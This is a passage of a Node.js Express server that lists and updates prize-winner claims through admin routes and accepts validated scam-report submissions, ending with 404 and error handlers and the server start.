    const claims = await WinnerClaim.find()
      .sort({ submittedAt: -1 })
      .select("-__v")
      .lean();
    res.json({ claims });
  } catch (err) {
    console.error("admin claims list error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

app.patch("/api/admin/claims/:id/status", async (req, res) => {
  try {
    const allowedStatuses = [
      "Pending Review",
      "Seen",
      "Delivery Ready",
      "Completed",
    ];
    const status = clean(req.body.status);
    if (!allowedStatuses.includes(status)) {
      return res.status(400).json({ error: "Invalid claim status." });
    }
    const claim = await WinnerClaim.findByIdAndUpdate(
      req.params.id,
      { status },
      { new: true, runValidators: true },
    ).lean();
    if (!claim) return res.status(404).json({ error: "Claim not found." });
    res.json({ claim });
  } catch (err) {
    console.error("admin claim update error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// ── Reports ────────────────────────────────────────────────────────────────────
app.post("/api/reports", async (req, res) => {
  try {
    const { name, email, phone, description } = req.body;
    if (!name || String(name).trim() === "")
      return res.status(400).json({ error: "Name is required." });
    if (!email || String(email).trim() === "")
      return res.status(400).json({ error: "Email is required." });
    if (!validator.isEmail(email))
      return res
        .status(400)
        .json({ error: "Please provide a valid email address." });
    if (!description || String(description).trim() === "")
      return res.status(400).json({ error: "Description is required." });
    if (description.length > 2000)
      return res
        .status(400)
        .json({ error: "Description must be under 2000 characters." });

    const report = new ScamReport({
      name: clean(name),
      email: validator.normalizeEmail(email) || clean(email),
      phone: phone ? clean(phone) : "",
      description: clean(description),
    });

    await report.save();
    res
      .status(201)
      .json({
        success: true,
        message:
          "Thank you. Your report has been received and will be reviewed.",
      });
  } catch (err) {
    console.error("report save error:", err);
    res.status(500).json({ error: "Server error. Please try again later." });
  }
});

// 404
app.use((_req, res) => res.status(404).json({ error: "Route not found." }));

// Global error handler
app.use((err, _req, res, _next) => {
  console.error("Unhandled error:", err);
  res.status(500).json({ error: "Unexpected server error." });
});

app.listen(PORT, () =>
  console.log(`🚀 Server running on http://localhost:${PORT}`),
);
